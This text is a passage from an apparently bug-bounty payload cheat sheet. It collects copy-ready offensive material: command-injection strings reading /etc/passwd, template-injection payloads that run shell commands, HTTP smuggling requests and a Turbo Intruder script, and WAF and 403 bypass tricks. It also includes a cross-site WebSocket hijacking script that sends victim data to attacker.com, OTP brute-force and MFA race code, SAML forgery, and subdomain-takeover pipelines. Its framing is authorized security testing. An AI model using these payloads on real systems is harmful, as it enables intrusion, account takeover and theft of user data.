;$(printf '\x63\x61\x74') /etc/passwd

# Bypass via env
;$BASH -c 'id'
;${IFS}id

# Windows-specific
& dir
| type C:\Windows\win.ini
& ping -n 1 attacker.com
```

### Context-Specific (Filename Injection)
```bash
# File upload filenames
test.jpg; id
test$(id).jpg
test`id`.jpg
../test.jpg
../../../../../../etc/passwd
```

---

## SSTI DETECTION PAYLOADS (All Engines)

### Universal Probe (Send All, Observe Which Evaluate)
```
{{7*7}}        → 49 = Jinja2 (Python) or Twig (PHP)
${7*7}         → 49 = Freemarker (Java) or Spring EL
<%= 7*7 %>     → 49 = ERB (Ruby) or EJS (Node.js)
#{7*7}         → 49 = Mako (Python) or Pebble (Java)
*{7*7}         → 49 = Spring Thymeleaf
{{7*'7'}}      → 7777777 = Jinja2 (not Twig — Twig gives 49)
${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
```

### RCE Payloads by Engine

**Jinja2 (Python/Flask/Django):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

**Freemarker (Java):**
```
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**ERB (Ruby on Rails):**
```ruby
<%= `id` %>
<%= system("id") %>
<%= IO.popen('id').read %>
```

**Spring Thymeleaf:**
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

**EJS (Node.js):**
```javascript
<%= process.mainModule.require('child_process').execSync('id') %>
```

---

## HTTP SMUGGLING PAYLOADS

### CL.TE — Content-Length front-end, Transfer-Encoding back-end
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL — Transfer-Encoding front-end, Content-Length back-end
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0
```

### TE.TE — Both support Transfer-Encoding, obfuscate to disable one
```http
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### H2.CL — HTTP/2 front-end with Content-Length injection
```
# In Burp Repeater, switch to HTTP/2
# Add Content-Length header manually (not auto-set by HTTP/2)
# Front-end ignores CL (HTTP/2 uses :content-length pseudo-header)
# Back-end uses CL → desync
```

### Detection (Burp)
```
1. Install HTTP Request Smuggler extension
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. All four probe types automatically sent
4. ~10-second timeout on CL.TE probe = back-end waiting = CONFIRMED
```

---

### Turbo Intruder Script for Desync Detection

```python
# Full Turbo Intruder script for comprehensive desync testing
# Save as desync_test.py and load in Turbo Intruder

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        pipeline=False,
        maxRetriesPerRequest=0
    )
    
    # ===== CL.TE PROBES =====
    # Standard CL.TE
    clte_payload = b"POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED"
    engine.queue(clte_payload)
    
    # CL.TE with different paths
    for path in ["/", "/api", "/admin", "/login", "/graphql", "/api/v1"]:
        payload = f"POST {path} HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED".encode()
        engine.queue(payload)
    
    # ===== TE.CL PROBES =====
    tecl_payload = b"POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n"
    engine.queue(tecl_payload)
    
    # ===== TE.TE Obfuscation =====
    obfuscations = [
        b"Transfer-Encoding: ChUnKeD\r\n",
        b"Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n",
        b"Transfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\n",
        b"\tTransfer-Encoding: chunked\r\n",
        b" Transfer-Encoding: chunked\r\n",
        b"Transfer-Encoding:\r\n Transfer-Encoding: chunked\r\n",
    ]
    
    for obf in obfuscations:
        payload = b"POST / HTTP/1.1\r\nHost: target.com\r\n" + obf + b"\r\n0\r\n\r\nSMUGGLED"
        engine.queue(payload)
    
    # ===== Timing Probes =====
    for delay in [0, 1, 2, 3, 5, 10, 15, 20, 30, 60]:
        payload = f"POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED_{delay}".encode()
        engine.queue(payload, delay=delay)

def handleResponse(req, interesting):
    if req.time > 5000:
        table.add(req, "TIMING_ANOMALY")
    if "SMUGGLED" in req.response and req.response.count("SMUGGLED") > 1:
        table.add(req, "MULTIPLE_SMUGGLED")
    if req.status != 200 and req.status != 404:
        table.add(req, f"STATUS_{req.status}")
```

---

## WAF BYPASS REFERENCE

### Soft Block Detection (200 OK ≠ Bypass)

WAF vendors often return **HTTP 200 OK with a block page**:
- Cloudflare JS challenge: `200 OK` + `cf-challenge-form` body
- F5 BIG-IP: `200 OK` + "The requested URL was rejected" + `Support ID: xxxx`
- Imperva: `200 OK` + CAPTCHA page + `_Incapsula_Resource`
- Custom enterprise WAFs: `200 OK` + "Your request has been blocked. Log ID: WAF-..."
- AWS + CloudFront custom error pages: may return `200` or `403`

**401 and 500 are POSITIVE bypass signals:**
- `401 Unauthorized` = you reached the auth middleware (past WAF edge)
- `500 Internal Server Error` = payload triggered backend exception (SQLi/SSTI lead)

### 403 Bypass Quick Reference

| Category | Technique | Payload Example |
|---|---|---|
| IP spoofing | X-Forwarded-For | `X-Forwarded-For: 127.0.0.1` |
| IP spoofing | True-Client-IP | `True-Client-IP: 127.0.0.1` |
| IP spoofing | CF-Connecting-IP | `CF-Connecting-IP: 127.0.0.1` |
| URL rewrite | X-Original-URL | `X-Original-URL: /admin` |
| URL rewrite | X-Rewrite-URL | `X-Rewrite-URL: /admin` |
| Method override | X-HTTP-Method-Override | `X-HTTP-Method-Override: GET` |
| Method tampering | Verb swap | `POST /admin`, `PUT /admin`, `TRACE /admin` |
| Path encoding | URL-encoded slash | `/admin/%2e/`, `/admin%2F` |
| Path encoding | Double URL-encoded | `/admin/%252e/`, `/admin%252F` |
| Path tricks | Semicolon | `/admin;/`, `/admin/.;/` |
| Path tricks | Trailing dot/slash | `/admin/.`, `/admin//`, `/.admin` |

### Encoding Bypass Reference

| Layer | Original | Encoded | Use Case |
|---|---|---|---|
| URL single | `'` | `%27` | Standard URL |
| URL double | `'` | `%2527` | Decoder runs once on edge |
| Unicode JS | `'` | `'` | XSS in JS context |
| HTML decimal | `'` | `'` | Reflected XSS in HTML |
| SQL comment | `SELECT` | `SE/**/LECT` | MySQL/Postgres tokeniser |
| MySQL version | `SELECT` | `/*!50000 SELECT*/` | MySQL-only execution |
| SQL whitespace | ` ` | `/**/`, `%0a`, `%0b`, `+` | Replace space in SQL |

Generate all variants with: `bughunter/tools/waf_encoder.py "<payload>" --class sqli|xss|generic`

### Multipart Parser Confusion

| Technique | Effect |
|---|---|
| Boundary simplification (`boundary=x`) | Strips WebKit fingerprint, evades boundary-pattern rules |
| Null-byte in boundary (`--x\x00`) | Some parsers truncate at null, others don't |
| `Content-Disposition: form-data; name="f"; x=filename="shell.aspx"` | Payload hidden in sub-param |
| Per-part `Content-Type: image/jpeg` | Content scanner skips binary/image parts |

Generate variants with: `bughunter/tools/multipart_mutator.py --file shell.aspx --field file`

---

## WEBSOCKET PAYLOADS

### IDOR / Auth Bypass
```javascript
// Test: subscribe to other user's channel
{"action": "subscribe", "channel": "user_VICTIM_ID_HERE"}
{"action": "get_history", "userId": "VICTIM_UUID"}
{"action": "getProfile", "id": 2}
{"action": "admin.listUsers"}
{"action": "admin.getToken", "userId": "1"}
```

### Cross-Site WebSocket Hijacking (CSWSH)
```html
<!-- Host on attacker site. If no Origin validation, steals victim's WS data. -->
<script>
var ws = new WebSocket('wss://target.com/ws');
// Browser automatically sends victim's cookies
ws.onopen = () => ws.send(JSON.stringify({action:"getProfile"}));
ws.onmessage = (e) => fetch('https://attacker.com/?d='+encodeURIComponent(e.data));
</script>
```

### Test Origin Validation
```bash
# Should reject non-target origins. If it doesn't = CSWSH vulnerability
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
wscat -c "wss://target.com/ws" -H "Origin: null"
wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
```

---

## MFA / 2FA BYPASS PAYLOADS

### Pattern 1: OTP Brute Force (No Rate Limit)
```bash
ffuf -u "https://target.com/api/verify-otp" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 -t 5
```

### Pattern 2: OTP Reuse (Token Not Invalidated)
```
1. Request OTP → receive "123456"
2. Submit OTP correctly → authenticated
3. Log out → login again
4. Submit same OTP "123456" → if accepted = OTP never invalidated
```

### Pattern 3: Response Manipulation
```
Intercept wrong OTP response → change {"success":false} → {"success":true} → forward
```

### Pattern 4: Skip MFA Step (Workflow Bypass)
```bash
curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard
```

### Pattern 5: Race on MFA Verification
```python
async def race():
    async with aiohttp.ClientSession(cookies={"session": "YOUR_SESSION"}) as s:
        results = await asyncio.gather(verify(s, "123456"), verify(s, "123456"))
        print(results)
```

---

## SAML ATTACKS

### Attack 1: XML Signature Wrapping (XSW)
```xml
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature>VALID_SIGNATURE</ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### Attack 2: Comment Injection in NameID
```xml
<NameID>admin<!---->@company.com</NameID>
```

### Attack 3: Signature Stripping
```
1. Decode SAMLResponse (base64 -d)
2. Delete <Signature> element
3. Change NameID to admin@company.com
4. Re-encode and submit
```

---

## SUBDOMAIN TAKEOVER — COMPLETE FINGERPRINT DATABASE (from can-i-take-over-xyz + subjack)

### Vulnerable Services — Verified Fingerprints

| Service | CNAME Domains | Fingerprint (Regex) | Type | Verification |
|---------|---------------|---------------------|------|--------------|
| **AWS/Elastic Beanstalk** | `elasticbeanstalk.com` | `NXDOMAIN` | DNS | Create EB env |
| **AWS/S3** | `s3.amazonaws.com` | `The specified bucket does not exist` | HTTP | Create bucket |
| **AWS/CloudFront** | — | `ViewerCertificateException` | — | **Not vulnerable** |
| **AWS/Load Balancer (ELB)** | `elb.amazonaws.com` | `NXDOMAIN` | DNS | **Not vulnerable** |
| **Microsoft Azure** | `cloudapp.net`, `cloudapp.azure.com`, `azurewebsites.net`, `blob.core.windows.net`, `azure-api.net`, `azurehdinsight.net`, `azureedge.net`, `azurecontainer.io`, `database.windows.net`, `azuredatalakestore.net`, `search.windows.net`, `azurecr.io`, `redis.cache.windows.net`, `servicebus.windows.net`, `visualstudio.com` | `NXDOMAIN` | DNS | Create App Service |
| **GitHub Pages** | — | `There isn't a GitHub Pages site here.` | HTTP | Edge case |
| **GitLab Pages** | — | — | — | **Not vulnerable** |
| **Heroku** | — | `No such app` | HTTP | Edge case |
| **Bitbucket** | `bitbucket.io` | `Repository not found` | HTTP | Create repo |
| **Netlify** | — | `Not Found - Request ID:` | HTTP | Edge case |
| **Vercel** | — | `DEPLOYMENT_NOT_FOUND.` | HTTP | Edge case |
| **Firebase** | — | — | — | **Not vulnerable** |
| **Surge.sh** | `na-west1.surge.sh` | `project not found` | HTTP | Create project |
| **Pantheon** | — | `404 error unknown site!` | HTTP | Create site |
| **Readme.io** | `readme.io` | `The creators of this project are still working on making everything perfect!` | HTTP | Create project |
| **Readthedocs** | — | `The link you have followed or the URL that you entered does not exist.` | HTTP | Create project |
| **Shopify** | — | `Sorry, this shop is currently unavailable.` | HTTP | Edge case |
| **WordPress.com** | `wordpress.com` | `Do you want to register .*\.wordpress\.com\?` | HTTP | Register blog |
| **Strikingly** | `s.strikinglydns.com` | `PAGE NOT FOUND.` | HTTP | Create site |
| **Ghost** | `ghost.io` | `Site unavailable\|Failed to resolve DNS path for this host` | HTTP | Create site |
| **Tumblr** | — | `Whatever you were looking for doesn't currently exist at this address` | HTTP | Edge case |
| **Wix** | — | `Looks Like This Domain Isn't Connected To A Website Yet!` | HTTP | Edge case |
| **Webflow** | — | `The page you are looking for doesn't exist or has been moved.` | HTTP | Edge case |
| **Freshdesk** | — | `We couldn't find servicedesk.victim.tld` | HTTP | **Not vulnerable** |
| **Help Scout** | `helpscoutdocs.com` | `No settings were found for this company:` | HTTP | Create account |
| **Help Juice** | `helpjuice.com` | `We could not find what you're looking for.` | HTTP | Create account |
| **Helprace** | `helprace.com` | `HTTP_STATUS=301` | HTTP | Status 301 = vuln |
| **Zendesk** | — | `Help Center Closed` | HTTP | **Not vulnerable** |
| **Statuspage** | — | — | — | **Not vulnerable** (DNS verification) |
| **Fastly** | — | `Fastly error: unknown domain:` | HTTP | **Not vulnerable** |
| **Intercom** | — | `Uh oh. That page doesn't exist.` | HTTP | Edge case |
| **Discourse** | `trydiscourse.com` | `NXDOMAIN` | DNS | Create instance |
| **Anima** | `animaapp.io` | `The page you were looking for does not exist.` | HTTP | Create project |
| **Cargo Collective** | — | `404 Not Found` | HTTP | Create project |
| **Campaign Monitor** | — | `Trying to access your account?` | HTTP | Create account |
| **Canny** | — | `Company Not Found\|There is no such company` | HTTP | Create account |
| **GetResponse** | — | `With GetResponse Landing Pages` | HTTP | Create account |
| **JetBrains/YouTrack** | `youtrack.cloud` | `is not a registered InCloud YouTrack` | HTTP | Create instance |
| **LaunchRock** | `launchrock.com` | `HTTP_STATUS=500` | HTTP | Status 500 = vuln |
| **Ngrok** | `ngrok.io` | `Tunnel .*\.ngrok.io not found` | HTTP | Create tunnel |
| **Uptimerobot** | `stats.uptimerobot.com` | `page not found` | HTTP | Create monitor |
| **SurveySparrow** | `surveysparrow.com` | `Account not found.` | HTTP | Create account |
| **Uberflip** | `read.uberflip.com` | `The URL you've accessed does not provide a hub.` | HTTP | Create hub |
| **SmartJobBoard** | `52.16.160.97` | `This job board website is either expired or its domain name is invalid.` | HTTP | Create board |
| **Short.io** | — | `Link does not exist` | HTTP | Create link |
| **HatenaBlog** | `hatenablog.com` | `404 Blog is not found` | HTTP | Create blog |
| **Agile CRM** | `agilecrm.com` | `Sorry, this page is no longer available.` | HTTP | Create account |
| **Airee.ru** | `airee.ru` | `Ошибка 402. Сервис Айри.рф не оплачен` | HTTP | Russian service |
| **Gemfury** | `furyns.com` | `404: This page could not be found.` | HTTP | Create repo |
| **Google Cloud Storage** | — | `<Code>NoSuchBucket</Code>` | HTTP/XML | **Not vulnerable** |
| **Google Sites** | — | `The requested URL was not found on this server` | HTTP | **Not vulnerable** |
| **Kinsta** | — | `No Site For Domain` | HTTP | **Not vulnerable** |
| **Digital Ocean** | — | `Domain uses DO name servers with no records in DO.` | DNS | Create DO record |
| **Worksites** | `worksites.net`, `69.164.223.206` | `Hello! Sorry, but the website you're looking for doesn't exist.` | HTTP | Create site |

### Non-Vulnerable / Edge Case (Do Not Waste Time)

| Service | Status | Reason |
|---------|--------|--------|
| Akamai, CloudFront, Key CDN | Not vulnerable | CDN only |
| Firebase, Instapage, Kinsta, SendGrid, Squarespace, Unbounce, WP Engine | Not vulnerable | No takeover path |
| GitLab, GitHub (mostly), Netlify, Vercel, Fastly, HubSpot | Edge case | Requires specific config |
| Intercom, Tumblr, Wix, Webflow, WordPress.org, Shopify, Statuspage, Zendesk, Freshdesk | Edge case / Not vulnerable | Verification / ownership required |

---

### Advanced Takeover Vectors (from subjack)

#### 1. NS Delegation Takeover (`subjack -ns`)
**Expired NS domains** — Register expired nameserver → full DNS control
**Dangling NS delegations** — NS records point to deleted cloud DNS zones

| Provider | NS Pattern |
|----------|------------|
| AWS Route 53 | `ns-*.awsdns-*` |
| Google Cloud DNS | `ns-cloud-*.googledomains.com` |
| Azure DNS | `ns*-*.azure-dns.*` |
| DigitalOcean | `ns*.digitalocean.com` |
| Vultr | `ns*.vultr.com` |
| Linode | `ns*.linode.com` |

```bash
subjack -w subdomains.txt -ns -o ns_takeovers.json -ssl
```

#### 2. Stale A Record Takeover (`subjack -ar`)
**A records pointing to released cloud IPs** — Spin up instance on same provider until IP match

| Provider | Detection |
|----------|-----------|
| AWS, GCP, Azure, DigitalOcean, Linode, Vultr, Oracle | ICMP/TCP check |

```bash
sudo subjack -w subdomains.txt -ar -o stale_a.json -ssl
```

#### 3. Zone Transfer / AXFR (`subjack -axfr`)
**Misconfigured nameservers** leaking entire zone + NS bruteforce (`ns1`, `ns2`, `dns-0`, `ns-backup`)

```bash
subjack -w subdomains.txt -axfr -o axfr_results.json -ssl
```

#### 4. Email Takeover (`subjack -mail`)
**SPF include takeover** — Expired domain in `include:` → send authenticated email
**MX record takeover** — Expired mail server → intercept all inbound email (password resets, 2FA)

```bash
subjack -w subdomains.txt -mail -o email_takeovers.json -ssl
```

#### 5. SRV Record Takeover (`subjack -srv`)
**SRV records pointing to expired domains** — SIP, XMPP, LDAP, Kerberos, IMAP, CalDAV (~28 queries/domain)

```bash
subjack -w subdomains.txt -srv -o srv_takeovers.json -ssl
```

#### 6. CNAME Chain Takeover (automatic)
**Multi-level CNAME chains** (up to 10 deep) — intermediate targets may be claimable even if first hop isn't

---

### Complete 12-Step Pipeline Reference

| Step | Tool/Action | Key Command |
|---|---|---|
| 0 | Tool validation + fresh resolvers | `massdns -r resolvers.txt -t A example.com -o S -w fast.txt` |
| 1 | Passive enum (10 sources) | `subfinder + subdominator + assetfinder + crt.sh + Chaos + Wayback + AnubisDB + VT + ThreatCrowd` |
| 2 | puredns resolution | `puredns resolve subs.txt -r resolvers_fresh.txt -w resolved.txt --rate-limit 2000` |
| 3 | HTTP discovery (10 ports) | `httpx -ports 80,443,8080,8443,3000,5000,8000,8008,8088,8888 -threads 200` |
| 4 | CNAME extraction | `dnsx -l resolved.txt -cname -resp -threads 200 -o cname_detailed.txt` |
| 5 | Multi-tool scan | `nuclei -t takeovers/ & subjack -c fingerprints.json -ns -ar -mail -srv -axfr` |
| 6 | Cloud-specific checks | S3 (4 endpoints), Azure App Service, GCS |
| 7 | Header/TLS analysis | `curl -I` for Server, X-*, cert subject |
| 7b | Fingerprint matching | `can-i-take-over-xyz` (100+ services) |
| 8 | Consolidation | `sort -u \| awk '!seen[tolower($0)]++'` |
| 9 | Manual verification | `curl -L -m 15` + evidence HTML saved |
| 10 | Canary tokens | `interactsh-client` + deploy (path, POST, query, header, referer) |
| 11 | Chain escalation | Check cookies, OAuth redirect_uri, CSP allowlist |
| 12 | Professional report | Auto-generate with evidence |

---

### Quick-Kill Fingerprints (Extended — Copy-Paste Ready)

```bash
# AWS S3
NoSuchBucket|The specified bucket does not exist|BucketNotFound|InvalidBucketName

# Azure App Service
The app you are looking for is not found|No Such Account

# GitHub Pages
There isn.t a GitHub Pages site here

# Heroku
No such app

# Netlify
Not Found - Request ID:

# Vercel
DEPLOYMENT_NOT_FOUND

# Surge.sh
project not found

# Pantheon
404 error unknown site!

# Readme.io
The creators of this project are still working on making everything perfect

# Readthedocs
The link you have followed or the URL that you entered does not exist

# Shopify
Sorry, this shop is currently unavailable

# WordPress.com
Do you want to register .*\.wordpress\.com

# Strikingly
PAGE NOT FOUND

# Ghost
Site unavailable|Failed to resolve DNS path for this host

# Tumblr
Whatever you were looking for doesn't currently exist at this address

# Wix
Looks Like This Domain Isn't Connected To A Website Yet

# Webflow
The page you are looking for doesn't exist or has been moved

# Bitbucket
Repository not found

# Help Scout
No settings were found for this company

# Help Juice
We could not find what you're looking for

# Helprace
HTTP_STATUS=301

# Firebase (Not vulnerable - skip)
# Fastly (Not vulnerable - skip)
# CloudFront (Not vulnerable - skip)
# Google Cloud Storage (Not vulnerable - skip)
# Google Sites (Not vulnerable - skip)
# Digital Ocean (NXDOMAIN)
# Statuspage (Not vulnerable - DNS verification)
# Zendesk (Not vulnerable - Help Center Closed)
# Freshdesk (Not vulnerable)

# Generic (verify manually)
404 Not Found|400 Bad Request
```

---

### Canary Token Deployment (Proof Generation)

```bash
# Start interactsh
interactsh-client -v -json -o canary.log &
CANARY_PID=$!
sleep 3
CANARY_DOMAIN=$(grep -oE "[a-z0-9]+\.interact\.sh" canary.log | head -1)

# Deploy to all targets (5 vectors)
cat targets_to_verify.txt | xargs -P 5 -I {} bash -c '
url={}
curl -s -m 10 "$url/$CANARY_DOMAIN" >/dev/null 2>&1           # Path
curl -s -m 10 -X POST "$url" -d "canary=$CANARY_DOMAIN" >/dev/null 2>&1  # POST
curl -s -m 10 "$url/?token=$CANARY_DOMAIN" >/dev/null 2>&1    # Query
curl -s -m 10 -H "X-Canary: $CANARY_DOMAIN" "$url" >/dev/null 2>&1      # Header
curl -s -m 10 -H "Referer: https://$CANARY_DOMAIN" "$url" >/dev/null 2>&1  # Referer
echo "Canary deployed: $url"
'

sleep 60
if grep -q "interaction" canary.log 2>/dev/null; then
    echo "✅ CANARY TRIGGERED - CONFIRMED TAKEOVERS:"
    grep "interaction" canary.log | jq -r '"\(.protocol) \(.client_ip) \(.full_id)"' | sort -u
fi
kill $CANARY_PID 2>/dev/null
```

---

### S3 Multi-Vector Testing (4 Endpoints)

```bash
endpoints="s3.amazonaws.com s3-website-us-east-1.amazonaws.com s3-website-us-west-2.amazonaws.com s3-website-eu-west-1.amazonaws.com"
for endpoint in $endpoints; do
    curl -s -I "http://$bucket.$endpoint" 2>/dev/null | grep -qi "x-amz-bucket-region\|x-amz-request-id" && echo "LIVE_BUCKET: $bucket ($endpoint)"
    curl -s "http://$bucket.$endpoint" 2>/dev/null | grep -qi "NoSuchBucket" && echo "S3_TAKEOVER: $bucket.$endpoint"
done
```

---

### GCS Testing

```bash
bucket=<extracted from CNAME>
curl -s "https://storage.googleapis.com/$bucket" 2>/dev/null | grep -q "NoSuchBucket" && echo "GCS_TAKEOVER: $bucket"
```

---

### Azure App Service Testing

```bash
sub=<subdomain>
cname=$(dig +short CNAME "$sub" 2>/dev/null | head -1)
if echo "$cname" | grep -q "azurewebsites.net"; then
    resp=$(curl -s -m 10 "https://$sub" 2>/dev/null)
    echo "$resp" | grep -q "The app you are looking for is not found" && echo "AZURE_TAKEOVER: $sub -> $cname"
fi
```

---

### Impact Escalation Matrix

| Finding | Chain Required | Final Severity | Payout Range |
|---------|---------------|----------------|--------------|
| Basic takeover (serve HTML) | None | Low/Medium | $200–$1K |
| + Cookie `domain=.target.com` | Steal session | **High** | $1K–$5K |
| + OAuth `redirect_uri` allowlist | Register as callback | **Critical** | $5K–$25K |
| + CSP allowlist | Bypass CSP for XSS | **Critical** | $5K–$25K |
| + S3 bucket with JS bundles | Extract API keys/secrets | **High** | $2K–$10K |
| + NS takeover | Full DNS control | **Critical** | $10K–$50K |
| + Stale A record (AWS/GCP/Azure) | Instance spin-up | **Critical** | $10K–$50K |
| + SPF include takeover | Email spoofing | **High** | $2K–$10K |
| + MX record takeover | Email interception | **Critical** | $10K–$50K |
| + SRV takeover | Service impersonation | **High** | $1K–$5K |
| + AXFR zone transfer | Full zone leak | **High** | $2K–$10K |

---

### Testing Checklist (Complete)

```
[ ] Tool validation: subfinder subdominator assetfinder puredns dnsx httpx nuclei subjack massdns jq anew xargs curl dig openssl interactsh-client
[ ] Fresh resolvers: trickest + massdns filter (2000 fast, no 127.0.0.1)
[ ] Passive enum: 10 sources (crt.sh, crt.name, Chaos, subfinder, subdominator, assetfinder, Wayback, AnubisDB, VT, ThreatCrowd)
[ ] puredns resolution: rate-limit 2000, deduplicated
[ ] httpx: 10 ports, CDN detection, 200 threads, follow redirects
[ ] CNAME extraction: dnsx 200 threads, fresh resolvers
[ ] nuclei: takeover templates, rate-limit 150
[ ] subjack: CNAME + NS + A + MX/SPF + SRV + AXFR (all parallel)
[ ] Service-specific: S3 (4 endpoints), Azure, GCS
[ ] Header/TLS: Server, X-*, cert subject
[ ] Fingerprint matching: can-i-take-over-xyz (100+ services)
[ ] Consolidation: dedup, prioritize (🔥⚠️🔍)
[ ] Manual verification: curl -L -m15, evidence HTML saved
[ ] Canary tokens: interactsh (path, POST, query, header, referer)
[ ] Professional report: executive summary, evidence, methodology, remediation
[ ] Chain escalation documented: cookies, OAuth, CSP, secrets
```

## GF PATTERN NAMES (tomnomnom/gf)

```bash
gf xss          # XSS parameters
gf ssrf         # SSRF parameters
gf idor         # IDOR parameters
gf sqli         # SQL injection parameters
gf redirect     # Open redirect parameters
gf lfi          # Local file inclusion
gf rce          # Remote code execution parameters
gf ssti         # Template injection parameters
gf debug_logic  # Debug/logic parameters
gf secrets      # Secret/token patterns
gf upload-fields # File upload parameters
gf cors         # CORS-related parameters
```

---

## ALWAYS REJECTED — NEVER SUBMIT

Submitting these destroys your validity ratio. N/A hurts. Don't.

```
Missing CSP / HSTS / X-Frame-Options / other security headers
Missing SPF / DKIM / DMARC
GraphQL introspection alone (no auth bypass, no IDOR)
Banner / version disclosure without a working CVE exploit
Clickjacking on non-sensitive pages (no sensitive action in PoC)
Tabnabbing
CSV injection (no actual code execution shown)
CORS wildcard (*) without credential exfil PoC
Logout CSRF
Self-XSS (only exploits own account)
Open redirect alone (no ATO chain, no OAuth code theft)
OAuth client_secret in mobile app (disclosed, expected)
SSRF with DNS callback only (no internal service access)
Host header injection alone (no password reset poisoning PoC)
Rate limit on non-critical forms (login page Cloudflare, search, contact)
Session not invalidated on logout
Concurrent sessions allowed
Internal IP address in error message
Mixed content (HTTP resources on HTTPS page)
SSL weak cipher suites
Missing HttpOnly / Secure cookie flags alone
Broken external links
Pre-account takeover (usually — requires very specific conditions)
Autocomplete on password fields
```

---

## CONDITIONALLY VALID — REQUIRES CHAIN

These are valid ONLY when combined with a chain that proves real impact:

| Standalone Finding | Chain Required | Result if Chained |
|---|---|---|
| Open redirect | + OAuth code theft via redirect_uri abuse | ATO (Critical) |
| Clickjacking | + sensitive action + working PoC | Medium |
| CORS wildcard | + credentialed request exfils user data | High |
| CSRF | + sensitive action (transfer funds, change email) | High |
| Rate limit bypass | + OTP/token brute force succeeding | Medium/High |
| SSRF DNS-only | + internal service access + data retrieval | Medium |
| Host header injection | + password reset email uses it | High |
| Prompt injection | + reads other user's data (IDOR) OR exfil OR RCE | High |
| S3 bucket listing | + JS bundles contain API keys/OAuth secrets | Medium/High |
| Self-XSS | + CSRF to trigger it on victim | Medium |
| Subdomain takeover | + OAuth redirect_uri registered at that subdomain | Critical |
| GraphQL introspection | + auth bypass mutation or IDOR on node() | High |

**Rule:** Build the chain first, confirm it works end-to-end, THEN report. Never report A and say "could chain with B" — prove it.

---

## WORDLISTS (Install in ~/wordlists/)

```
common.txt         # Common directories and files
params.txt         # Parameter names (id, user_id, file, etc.)
api-endpoints.txt  # API endpoint paths (/api/v1/users, etc.)
dirs.txt           # Directory names
sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
```

### Built-in Paths Worth Fuzzing

```bash
# Sensitive files
/.env
/.git/config
/config.json
/credentials.json
/backup.sql
/dump.sql
/.DS_Store
/robots.txt
/sitemap.xml
/.well-known/security.txt

# Admin panels
/admin
/admin/login
/administrator
/wp-admin
/manager
/console
/dashboard
/panel

# API discovery
/api
/api/v1
/api/v2
/graphql
/graphiql
/swagger
/swagger-ui.html
/api-docs
/openapi.json
/v1
/v2
```